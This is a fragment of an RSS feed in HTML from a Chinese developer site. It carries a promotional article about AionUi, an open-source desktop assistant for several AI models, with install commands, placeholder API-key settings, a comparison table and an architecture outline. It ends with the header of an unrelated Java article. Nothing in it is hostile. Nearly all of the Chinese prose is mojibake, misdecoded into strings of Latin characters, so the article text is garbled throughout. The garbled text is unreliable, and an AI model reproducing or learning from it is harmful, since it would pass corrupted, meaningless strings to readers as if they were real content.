<li>ç†Ÿæ‚‰æ¡Œé¢åº”ç”¨çš„ä½¿ç”¨</li>
<li>äº†è§£API Keyçš„é…ç½®ï¼ˆå¯é€‰ï¼‰</li>
<li>å¯¹æ–‡ä»¶ç®¡ç†æœ‰åŸºæœ¬æ¦‚å¿µ</li>
</ul>
<hr/>
<h2 data-id="heading-3">é¡¹ç›®èƒŒæ™¯</h2>
<h3 data-id="heading-4">é¡¹ç›®ç®€ä»‹</h3>
<p><strong>AionUi</strong> æ˜¯ä¸€ä¸ª<strong>å…è´¹ã€æœ¬åœ°ã€å¼€æºçš„24/7 AIåŠå…¬åŠ©æ‰‹</strong>ï¼Œæ”¯æŒGemini CLIã€Claude Codeã€Codexã€OpenCodeã€Qwen Codeã€Goose CLIã€Auggieç­‰å¤šç§AIä»£ç†ã€‚å®ƒæä¾›äº†å®Œæ•´çš„GUIç•Œé¢å’ŒWebUIè¿œç¨‹è®¿é—®ï¼Œè®©AIåŠ©æ‰‹çœŸæ­£æˆä¸ºä½ çš„"24å°æ—¶åŠå…¬ä¼™ä¼´"ã€‚</p>
<p><strong>é¡¹ç›®è§£å†³çš„æ ¸å¿ƒé—®é¢˜</strong>ï¼š</p>
<ul>
<li>Claude Coworkä»…æ”¯æŒmacOSï¼Œä¸”é”å®šClaudeæ¨¡å‹</li>
<li>ç¼ºä¹è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹è§£å†³æ–¹æ¡ˆ</li>
<li>éœ€è¦æ”¯æŒå¤šæ¨¡å‹çš„ç»Ÿä¸€ç•Œé¢</li>
<li>éœ€è¦æœ¬åœ°éƒ¨ç½²ï¼Œä¿æŠ¤æ•°æ®éšç§</li>
<li>éœ€è¦è¿œç¨‹è®¿é—®èƒ½åŠ›ï¼Œå®ç°24/7å¯ç”¨</li>
</ul>
<p><strong>é¢å‘çš„ç”¨æˆ·ç¾¤ä½“</strong>ï¼š</p>
<ul>
<li>éœ€è¦è·¨å¹³å°AIåŠ©æ‰‹çš„å¼€å‘è€…</li>
<li>å¸Œæœ›æ›¿ä»£Claude Coworkçš„ç”¨æˆ·</li>
<li>éœ€è¦å¤šæ¨¡å‹æ”¯æŒçš„AIç”¨æˆ·</li>
<li>å¯¹æ•°æ®éšç§æœ‰è¦æ±‚çš„ç”¨æˆ·</li>
<li>éœ€è¦è¿œç¨‹è®¿é—®AIå·¥å…·çš„ç”¨æˆ·</li>
</ul>
<h3 data-id="heading-5">ä½œè€…/å›¢é˜Ÿä»‹ç»</h3>
<p><strong>å›¢é˜Ÿï¼šiOfficeAI</strong></p>
<ul>
<li><strong>èƒŒæ™¯</strong>ï¼šä¸“æ³¨äºAIåŠå…¬è‡ªåŠ¨åŒ–çš„å¼€æºå›¢é˜Ÿ</li>
<li><strong>ç†å¿µ</strong>ï¼šæ‰“é€ å…è´¹ã€å¼€æºã€è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹</li>
<li><strong>é¡¹ç›®å®šä½</strong>ï¼šClaude Coworkçš„å¼€æºæ›¿ä»£æ–¹æ¡ˆ</li>
</ul>
<p><strong>é¡¹ç›®åˆ›å»ºæ—¶é—´</strong>ï¼š2024å¹´ï¼ˆä»GitHubæ´»åŠ¨æ¥çœ‹æ˜¯æŒç»­æ´»è·ƒçš„é¡¹ç›®ï¼‰</p>
<h3 data-id="heading-6">é¡¹ç›®æ•°æ®</h3>
<ul>
<li>â­ <strong>GitHub Stars</strong>: 11.7k+ï¼ˆæŒç»­å¿«é€Ÿå¢é•¿ï¼‰</li>
<li>ğŸ´ <strong>Forks</strong>: 884+</li>
<li>ğŸ“¦ <strong>ç‰ˆæœ¬</strong>: v1.7.8ï¼ˆæœ€æ–°ç‰ˆæœ¬ï¼Œ2026å¹´1æœˆ28æ—¥å‘å¸ƒï¼‰</li>
<li>ğŸ“„ <strong>License</strong>: Apache-2.0ï¼ˆå®Œå…¨å¼€æºï¼Œè‡ªç”±ä½¿ç”¨ï¼‰</li>
<li>ğŸŒ <strong>å®˜ç½‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aionui.com" target="_blank" title="https://www.aionui.com" ref="nofollow noopener noreferrer">www.aionui.com</a></li>
<li>ğŸ“š <strong>æ–‡æ¡£</strong>: åŒ…å«å®Œæ•´çš„ä½¿ç”¨æŒ‡å—å’Œé…ç½®æ–‡æ¡£</li>
<li>ğŸ’¬ <strong>ç¤¾åŒº</strong>: GitHub Issueså’ŒDiscussionsæ´»è·ƒ</li>
<li>ğŸ‘¥ <strong>è´¡çŒ®è€…</strong>: 31ä½è´¡çŒ®è€…ï¼Œæ´»è·ƒçš„ç¤¾åŒºå‚ä¸</li>
</ul>
<p><strong>é¡¹ç›®å‘å±•å†ç¨‹</strong>ï¼š</p>
<ul>
<li>2024å¹´ï¼šé¡¹ç›®åˆ›å»ºï¼Œå¼€å§‹æ„å»ºæ ¸å¿ƒåŠŸèƒ½</li>
<li>2024å¹´ä¸­ï¼šæ·»åŠ å¤šæ¨¡å‹æ”¯æŒå’ŒWebUIåŠŸèƒ½</li>
<li>2024å¹´åº•ï¼šå®Œå–„æ–‡ä»¶ç®¡ç†å’Œé¢„è§ˆåŠŸèƒ½</li>
<li>2025å¹´ï¼šæ·»åŠ AIå›¾åƒç”Ÿæˆå’Œç¼–è¾‘åŠŸèƒ½</li>
<li>2026å¹´ï¼šæŒç»­ä¼˜åŒ–ï¼Œç¤¾åŒºæ´»è·ƒåº¦æŒç»­æå‡</li>
</ul>
<hr/>
<h2 data-id="heading-7">ä¸»è¦åŠŸèƒ½</h2>
<h3 data-id="heading-8">æ ¸å¿ƒä½œç”¨</h3>
<p>AionUiçš„æ ¸å¿ƒä½œç”¨æ˜¯<strong>æä¾›ä¸€ä¸ªå…è´¹ã€å¼€æºã€è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹</strong>ï¼Œä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3c6bedaf8f84256893efd061ed4ff50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382563&amp;x-signature=rH6CvTezxRwIRv4MZm7qePaCGt0%3D" alt="07-01-aionui-function-banner.png" loading="lazy"/></p>
<ol>
<li><strong>å¤šæ¨¡å‹ç»Ÿä¸€ç®¡ç†</strong>ï¼šæ”¯æŒGeminiã€Claudeã€OpenAIã€Qwenã€Ollamaç­‰å¤šç§AIæ¨¡å‹ï¼Œç»Ÿä¸€ç®¡ç†å¯¹è¯å†å²</li>
<li><strong>è·¨å¹³å°ä½¿ç”¨</strong>ï¼šmacOSã€Windowsã€Linuxå…¨å¹³å°æ”¯æŒï¼Œæ”¯æŒWebUIè¿œç¨‹è®¿é—®</li>
<li><strong>æ–‡ä»¶æ™ºèƒ½ç®¡ç†</strong>ï¼šAIé©±åŠ¨çš„æ–‡ä»¶ç»„ç»‡ã€æ‰¹é‡å¤„ç†ã€Excelåˆ†æç­‰</li>
<li><strong>å®æ—¶é¢„è§ˆ</strong>ï¼šæ”¯æŒPDFã€Wordã€Excelã€PPTã€ä»£ç ã€Markdownç­‰9+ç§æ ¼å¼çš„å³æ—¶é¢„è§ˆå’Œç¼–è¾‘</li>
<li><strong>AIå›¾åƒç”Ÿæˆ</strong>ï¼šé›†æˆGemini 2.5 Flashã€Nanoã€Bananaç­‰å¤šç§å›¾åƒç”Ÿæˆæ¨¡å‹</li>
</ol>
<h3 data-id="heading-9">å¿«é€Ÿå¼€å§‹</h3>
<h4 data-id="heading-10">å®‰è£…æ–¹å¼</h4>
<p>AionUiæ”¯æŒå¤šç§å®‰è£…æ–¹å¼ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼1ï¼šä»GitHub Releasesä¸‹è½½ï¼ˆæ¨èï¼‰</span>
<span class="hljs-comment"># è®¿é—® https://github.com/iOfficeAI/AionUi/releases</span>
<span class="hljs-comment"># ä¸‹è½½å¯¹åº”å¹³å°çš„å®‰è£…åŒ…</span>

<span class="hljs-comment"># macOS</span>
<span class="hljs-comment"># ä¸‹è½½ .dmg æ–‡ä»¶å¹¶å®‰è£…</span>

<span class="hljs-comment"># Windows</span>
<span class="hljs-comment"># ä¸‹è½½ .exe æ–‡ä»¶å¹¶å®‰è£…</span>

<span class="hljs-comment"># Linux</span>
<span class="hljs-comment"># ä¸‹è½½ .AppImage æˆ– .deb/.rpm æ–‡ä»¶å¹¶å®‰è£…</span>

<span class="hljs-comment"># æ–¹å¼2ï¼šä»æºç æ„å»º</span>
git <span class="hljs-built_in">clone</span> https://github.com/iOfficeAI/AionUi.git
<span class="hljs-built_in">cd</span> AionUi
npm install
npm run build
</code></pre>
<h4 data-id="heading-11">åŸºæœ¬é…ç½®</h4>
<p><strong>1. é¦–æ¬¡å¯åŠ¨é…ç½®</strong></p>
<p>å¯åŠ¨AionUiåï¼Œé¦–æ¬¡ä½¿ç”¨éœ€è¦é…ç½®AIæœåŠ¡ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># æ”¯æŒGoogleè´¦å·ç™»å½•ï¼ˆè‡ªåŠ¨å…³è”Gemini CLIï¼‰</span>
<span class="hljs-comment"># æˆ–ä½¿ç”¨API Keyé…ç½®</span>

<span class="hljs-comment"># Geminié…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"gemini"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_GEMINI_API_KEY"</span>

<span class="hljs-comment"># Claudeé…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"anthropic"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_CLAUDE_API_KEY"</span>

<span class="hljs-comment"># OpenAIé…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"openai"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_OPENAI_API_KEY"</span>

<span class="hljs-comment"># æœ¬åœ°æ¨¡å‹é…ç½®ï¼ˆOllamaï¼‰</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"custom"</span>
<span class="hljs-attr">apiUrl:</span> <span class="hljs-string">"http://localhost:11434/v1"</span>
</code></pre>
<p><strong>2. æœ€ç®€å•çš„ä½¿ç”¨ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å¯åŠ¨AionUiåº”ç”¨</span>
<span class="hljs-comment"># 2. é€‰æ‹©AIæ¨¡å‹ï¼ˆå¦‚Gemini CLIï¼‰</span>
<span class="hljs-comment"># 3. å¼€å§‹å¯¹è¯</span>

ç”¨æˆ·ï¼š<span class="hljs-string">"å¸®æˆ‘æ•´ç†ä¸€ä¸‹æ¡Œé¢ä¸Šçš„æ–‡ä»¶"</span>
AIï¼š<span class="hljs-string">"æˆ‘æ¥å¸®ä½ æ•´ç†æ–‡ä»¶ã€‚è¯·å‘Šè¯‰æˆ‘ä½ çš„æ•´ç†åå¥½..."</span>

ç”¨æˆ·ï¼š<span class="hljs-string">"ç”Ÿæˆä¸€ä¸ªReactç»„ä»¶çš„ä»£ç "</span>
AIï¼š<span class="hljs-string">"æˆ‘æ¥ä¸ºä½ ç”Ÿæˆä¸€ä¸ªReactç»„ä»¶..."</span>
</code></pre>
<h3 data-id="heading-12">æ ¸å¿ƒç‰¹æ€§</h3>
<ul>
<li><strong>å¤šä¼šè¯ç®¡ç†</strong>ï¼šæ”¯æŒå¤šä¼šè¯å¹¶å‘ï¼Œæ¯ä¸ªä¼šè¯ç‹¬ç«‹ä¸Šä¸‹æ–‡ï¼Œæœ¬åœ°SQLiteå­˜å‚¨</li>
<li><strong>WebUIè¿œç¨‹è®¿é—®</strong>ï¼šæµè§ˆå™¨è®¿é—®ï¼Œæ”¯æŒç§»åŠ¨è®¾å¤‡ï¼Œ24/7å¯ç”¨ï¼Œæ”¯æŒSSHéš§é“</li>
<li><strong>å¤šæ¨¡å‹ç”Ÿæ€</strong>ï¼šä¸»æµæ¨¡å‹ï¼ˆGeminiã€OpenAIã€Claudeã€Qwenï¼‰+ æœ¬åœ°æ¨¡å‹ï¼ˆOllamaã€LM Studioï¼‰+ è‡ªå®šä¹‰å¹³å°</li>
<li><strong>æ™ºèƒ½æ–‡ä»¶ç®¡ç†</strong>ï¼šæ–‡ä»¶æ ‘æµè§ˆã€æ‹–æ‹½ä¸Šä¼ ã€AIæ™ºèƒ½ç»„ç»‡ã€æ‰¹é‡å¤„ç†</li>
<li><strong>å®æ—¶é¢„è§ˆç¼–è¾‘</strong>ï¼š9+æ ¼å¼æ”¯æŒï¼Œå®æ—¶è·Ÿè¸ªæ–‡ä»¶å˜åŒ–ï¼Œæ”¯æŒMarkdown/ä»£ç /HTMLç¼–è¾‘</li>
<li><strong>AIå›¾åƒç”Ÿæˆ</strong>ï¼šé›†æˆå¤šç§å›¾åƒç”Ÿæˆæ¨¡å‹ï¼Œæ”¯æŒå›¾åƒè¯†åˆ«å’Œç¼–è¾‘</li>
<li><strong>ç•Œé¢å®šåˆ¶</strong>ï¼šCSSè‡ªå®šä¹‰ç•Œé¢ï¼Œè‡ªç”±å®šåˆ¶é¢œè‰²ã€æ ·å¼ã€å¸ƒå±€</li>
<li><strong>æ•°æ®å®‰å…¨</strong>ï¼šå®Œå…¨æœ¬åœ°å­˜å‚¨ï¼Œæ•°æ®ä¸ä¸Šäº‘ï¼Œç”¨æˆ·å®Œå…¨æ§åˆ¶</li>
</ul>
<h3 data-id="heading-13">é¡¹ç›®ä¼˜åŠ¿</h3>

































































<table><thead><tr><th align="left">å¯¹æ¯”é¡¹</th><th align="left">AionUi</th><th align="left">Claude Cowork</th><th align="left">å…¶ä»–AIåŠ©æ‰‹</th></tr></thead><tbody><tr><td align="left"><strong>å¹³å°æ”¯æŒ</strong></td><td align="left">macOS / Windows / Linux</td><td align="left">macOS Only</td><td align="left">éƒ¨åˆ†è·¨å¹³å°</td></tr><tr><td align="left"><strong>æ¨¡å‹æ”¯æŒ</strong></td><td align="left">å¤šæ¨¡å‹ï¼ˆGeminiã€Claudeã€OpenAIç­‰ï¼‰</td><td align="left">Claude Only</td><td align="left">å•ä¸€æ¨¡å‹</td></tr><tr><td align="left"><strong>è®¿é—®æ–¹å¼</strong></td><td align="left">GUI + WebUIè¿œç¨‹è®¿é—®</td><td align="left">GUI Only</td><td align="left">GUIä¸ºä¸»</td></tr><tr><td align="left"><strong>æˆæœ¬</strong></td><td align="left">å®Œå…¨å…è´¹å¼€æº</td><td align="left">$100/æœˆè®¢é˜…</td><td align="left">éƒ¨åˆ†å…è´¹</td></tr><tr><td align="left"><strong>æ•°æ®éšç§</strong></td><td align="left">å®Œå…¨æœ¬åœ°å­˜å‚¨</td><td align="left">äº‘ç«¯å­˜å‚¨</td><td align="left">æ··åˆå­˜å‚¨</td></tr><tr><td align="left"><strong>æ–‡ä»¶ç®¡ç†</strong></td><td align="left">AIæ™ºèƒ½ç®¡ç†</td><td align="left">åŸºç¡€æ”¯æŒ</td><td align="left">æœ‰é™æ”¯æŒ</td></tr><tr><td align="left"><strong>é¢„è§ˆåŠŸèƒ½</strong></td><td align="left">9+æ ¼å¼å®æ—¶é¢„è§ˆ</td><td align="left">æœ‰é™é¢„è§ˆ</td><td align="left">åŸºç¡€é¢„è§ˆ</td></tr><tr><td align="left"><strong>å›¾åƒç”Ÿæˆ</strong></td><td align="left">å¤šæ¨¡å‹æ”¯æŒ</td><td align="left">æ— </td><td align="left">éƒ¨åˆ†æ”¯æŒ</td></tr><tr><td align="left"><strong>å®šåˆ¶èƒ½åŠ›</strong></td><td align="left">CSSè‡ªå®šä¹‰ç•Œé¢</td><td align="left">æœ‰é™å®šåˆ¶</td><td align="left">æœ‰é™å®šåˆ¶</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆé€‰æ‹©AionUiï¼Ÿ</strong></p>
<p>ç›¸æ¯”Claude Coworkï¼ŒAionUiæä¾›è·¨å¹³å°æ”¯æŒã€å¤šæ¨¡å‹ç”Ÿæ€ã€WebUIè¿œç¨‹è®¿é—®ã€å®Œå…¨å…è´¹å¼€æºï¼Œæ˜¯æ›´å¼ºå¤§çš„æ›¿ä»£æ–¹æ¡ˆã€‚</p>
<hr/>
<h2 data-id="heading-14">é¡¹ç›®è¯¦ç»†å‰–æ</h2>
<h3 data-id="heading-15">æ¶æ„è®¾è®¡</h3>
<p>AionUié‡‡ç”¨<strong>Electron + React + TypeScript</strong>çš„ç°ä»£æ¡Œé¢åº”ç”¨æ¶æ„ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒæ¨¡å—ï¼š</p>
<h4 data-id="heading-16">æ ¸å¿ƒæ¶æ„</h4>
<pre><code class="hljs language-java" lang="java">AionUi Application
â”œâ”€â”€ Main <span class="hljs-title function_">Process</span> <span class="hljs-params">(Electron)</span>
â”‚   â”œâ”€â”€ çª—å£ç®¡ç†
â”‚   â”œâ”€â”€ ç³»ç»Ÿé›†æˆ
â”‚   â”œâ”€â”€ æ–‡ä»¶ç³»ç»Ÿè®¿é—®
â”‚   â””â”€â”€ æœ¬åœ°æ•°æ®åº“ç®¡ç†
â”œâ”€â”€ Renderer <span class="hljs-title function_">Process</span> <span class="hljs-params">(React)</span>
â”‚   â”œâ”€â”€ UIç»„ä»¶å±‚
â”‚   â”œâ”€â”€ çŠ¶æ€ç®¡ç†
â”‚   â”œâ”€â”€ APIè°ƒç”¨å±‚
â”‚   â””â”€â”€ æ–‡ä»¶é¢„è§ˆç»„ä»¶
â”œâ”€â”€ AIæœåŠ¡å±‚
â”‚   â”œâ”€â”€ å¤šæ¨¡å‹é€‚é…å™¨
â”‚   â”œâ”€â”€ APIè°ƒç”¨å°è£…
â”‚   â”œâ”€â”€ æµå¼å“åº”å¤„ç†
â”‚   â””â”€â”€ ä¸Šä¸‹æ–‡ç®¡ç†
â””â”€â”€ æ•°æ®å±‚
    â”œâ”€â”€ SQLiteæ•°æ®åº“ï¼ˆå¯¹è¯å†å²ï¼‰
    â”œâ”€â”€ æœ¬åœ°æ–‡ä»¶å­˜å‚¨
    â””â”€â”€ é…ç½®ç®¡ç†
</code></pre>
<h4 data-id="heading-17">å¤šæ¨¡å‹é€‚é…æ¶æ„</h4>
<p>AionUié€šè¿‡ç»Ÿä¸€çš„é€‚é…å™¨æ¨¡å¼æ”¯æŒå¤šç§AIæ¨¡å‹ï¼Œæ¯ä¸ªæ¨¡å‹ï¼ˆGeminiã€Claudeã€OpenAIç­‰ï¼‰éƒ½æœ‰ç‹¬ç«‹çš„é€‚é…å™¨å®ç°ï¼Œé€šè¿‡ç»Ÿä¸€çš„<code>AIModelAdapter</code>æ¥å£ç®¡ç†ã€‚è¿™ç§è®¾è®¡ä½¿å¾—æ·»åŠ æ–°æ¨¡å‹å˜å¾—ç®€å•ï¼Œå„æ¨¡å‹å®ç°ç‹¬ç«‹ï¼Œæ”¯æŒåŠ¨æ€åŠ è½½å’Œé…ç½®ã€‚</p>
<h4 data-id="heading-18">WebUIè¿œç¨‹è®¿é—®æ¶æ„</h4>
<p>AionUiçš„WebUIé€šè¿‡å†…ç½®ExpressæœåŠ¡å™¨å’ŒWebSocketå®ç°ï¼Œæä¾›é™æ€æ–‡ä»¶æœåŠ¡ã€APIè·¯ç”±ï¼ˆèŠå¤©ã€ä¼šè¯ã€æ¨¡å‹ç®¡ç†ï¼‰å’Œå®æ—¶é€šä¿¡ã€‚æ”¯æŒTokenè®¤è¯ã€HTTPSã€IPç™½åå•å’ŒSSHéš§é“ç­‰å®‰å…¨æœºåˆ¶ã€‚</p>
<h3 data-id="heading-19">æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ</h3>
<p>AionUiçš„æ–‡ä»¶ç®¡ç†ç³»ç»Ÿæ”¯æŒæ–‡ä»¶æ ‘æµè§ˆã€æ‹–æ‹½ä¸Šä¼ å’ŒAIé©±åŠ¨çš„æ™ºèƒ½ç»„ç»‡ã€‚é€šè¿‡<code>FileTreeManager</code>æ‰«ææ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨AIåˆ†ææ–‡ä»¶å¹¶æ‰§è¡Œç»„ç»‡æ“ä½œã€‚æ”¯æŒæ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„é€’å½’å¤„ç†ã€‚</p>
<h3 data-id="heading-20">é¢„è§ˆé¢æ¿ç³»ç»Ÿ</h3>
<p>AionUiçš„é¢„è§ˆé¢æ¿é€šè¿‡<code>PreviewComponent</code>æ¥å£å®ç°æ’ä»¶åŒ–æ¶æ„ï¼Œæ”¯æŒPDFã€Wordã€Excelã€PPTã€ä»£ç ã€Markdownã€HTMLã€å›¾åƒã€JSON/YAML/CSVç­‰9+ç§æ ¼å¼ã€‚æ¯ä¸ªé¢„è§ˆç»„ä»¶å®ç°<code>canPreview</code>ã€<code>render</code>ã€<code>update</code>æ–¹æ³•ï¼Œ<code>PreviewManager</code>è´Ÿè´£ç®¡ç†å’Œè·¯ç”±ã€‚æ”¯æŒå®æ—¶æ–‡ä»¶ç›‘å¬å’Œç¼–è¾‘ã€‚</p>
<h3 data-id="heading-21">å¤šä¼šè¯ç®¡ç†ç³»ç»Ÿ</h3>
<p>AionUiçš„<code>ConversationManager</code>ç®¡ç†å¤šä¸ªå¹¶å‘ä¼šè¯ï¼Œæ¯ä¸ªä¼šè¯åŒ…å«ç‹¬ç«‹çš„å¯¹è¯å†å²ã€æ¨¡å‹é…ç½®å’Œå…ƒæ•°æ®ã€‚æ”¯æŒè‡ªåŠ¨æ ‡é¢˜ç”Ÿæˆã€æ™ºèƒ½ä¸Šä¸‹æ–‡æˆªå–ï¼ˆåŸºäºTokené™åˆ¶ï¼‰ã€SQLiteæœ¬åœ°æŒä¹…åŒ–å’Œå¿«é€Ÿåˆ‡æ¢ã€‚</p>
<h3 data-id="heading-22">AIå›¾åƒç”Ÿæˆç³»ç»Ÿ</h3>
<p>AionUié€šè¿‡<code>ImageGenerator</code>æ¥å£å®ç°æ’ä»¶åŒ–çš„å›¾åƒç”Ÿæˆæ¶æ„ï¼Œæ”¯æŒGemini 2.5 Flash Image Previewã€Nanoã€Bananaç­‰å¤šç§æ¨¡å‹ã€‚<code>ImageGenerationManager</code>ç»Ÿä¸€ç®¡ç†æ‰€æœ‰ç”Ÿæˆå™¨ï¼Œæ”¯æŒå•ä¸ªå’Œæ‰¹é‡ç”Ÿæˆã€‚</p>
<h3 data-id="heading-23">æœ¬åœ°æ•°æ®å®‰å…¨</h3>
<p>AionUiä½¿ç”¨SQLiteæ•°æ®åº“å­˜å‚¨æ‰€æœ‰æ•°æ®ï¼ˆå¯¹è¯å†å²ã€æ–‡ä»¶å…ƒæ•°æ®ã€è®¾ç½®ï¼‰ï¼Œæ•°æ®å®Œå…¨å­˜å‚¨åœ¨ç”¨æˆ·æ•°æ®ç›®å½•ï¼Œä¸ä¼šä¸Šä¼ åˆ°ä»»ä½•æœåŠ¡å™¨ã€‚æ”¯æŒå¯é€‰çš„æ•°æ®åŠ å¯†å’Œæ•°æ®å¯¼å‡ºåŠŸèƒ½ï¼Œç”¨æˆ·å®Œå…¨æ§åˆ¶è‡ªå·±çš„æ•°æ®ã€‚</p>
<hr/>
<h2 data-id="heading-24">é¡¹ç›®åœ°å€ä¸èµ„æº</h2>
<h3 data-id="heading-25">å®˜æ–¹èµ„æº</h3>
<ul>
<li>ğŸŒŸ <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi" target="_blank" title="https://github.com/iOfficeAI/AionUi" ref="nofollow noopener noreferrer">github.com/iOfficeAI/Aâ€¦</a></li>
<li>ğŸ“š <strong>æ–‡æ¡£</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi%2Fwiki" target="_blank" title="https://github.com/iOfficeAI/AionUi/wiki" ref="nofollow noopener noreferrer">GitHub Wiki</a></li>
<li>ğŸ’¬ <strong>ç¤¾åŒº</strong>: GitHub Discussions</li>
<li>ğŸ› <strong>Issue Tracker</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi%2Fissues" target="_blank" title="https://github.com/iOfficeAI/AionUi/issues" ref="nofollow noopener noreferrer">GitHub Issues</a></li>
<li>ğŸ“¦ <strong>æœ€æ–°ç‰ˆæœ¬</strong>: v1.7.8ï¼ˆ2026å¹´1æœˆ28æ—¥å‘å¸ƒï¼‰</li>
</ul>
<h3 data-id="heading-26">é€‚ç”¨äººç¾¤</h3>
<p><strong>AionUiç‰¹åˆ«é€‚åˆ</strong>ï¼šéœ€è¦è·¨å¹³å°AIåŠ©æ‰‹çš„å¼€å‘è€…ã€å¤šæ¨¡å‹ç”¨æˆ·ã€å¯¹æ•°æ®éšç§æœ‰è¦æ±‚çš„ç”¨æˆ·ã€éœ€è¦åŠå…¬è‡ªåŠ¨åŒ–åŠŸèƒ½çš„ç”¨æˆ·ï¼Œä»¥åŠå¸Œæœ›æ›¿ä»£Claude Coworkçš„å…è´¹å¼€æºæ–¹æ¡ˆçš„ç”¨æˆ·ã€‚</p>
<p><strong>ä¸é€‚åˆ</strong>ï¼šåªéœ€è¦ç®€å•èŠå¤©çš„ç”¨æˆ·ã€ä¸éœ€è¦è·¨å¹³å°çš„macOSç”¨æˆ·ã€ä¸éœ€è¦å¤šæ¨¡å‹æ”¯æŒçš„ç”¨æˆ·ã€‚</p>
<hr/>
<p><em>æ¬¢è¿æ¥æˆ‘ä¸­çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a>æ‰¾åˆ°æ›´å¤šæœ‰ç”¨çš„çŸ¥è¯†å’Œæœ‰è¶£çš„äº§å“</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java å¹¶è¡Œä»»åŠ¡åä½œå¼å–æ¶ˆæœºåˆ¶è®¾è®¡ä¸å®ç°]]></title>    <link>https://juejin.cn/post/7600955777315848230</link>    <guid>https://juejin.cn/post/7600955777315848230</guid>    <pubDate>2026-01-30T13:01:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315848230" data-draft-id="7600953879500931123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java å¹¶è¡Œä»»åŠ¡åä½œå¼å–æ¶ˆæœºåˆ¶è®¾è®¡ä¸å®ç°"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T13:01:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¡¦è¯´ç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/2212689394274136"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java å¹¶è¡Œä»»åŠ¡åä½œå¼å–æ¶ˆæœºåˆ¶è®¾è®¡ä¸å®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2212689394274136/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¡¦è¯´ç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:01:02.000Z" title="Fri Jan 30 2026 13:01:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
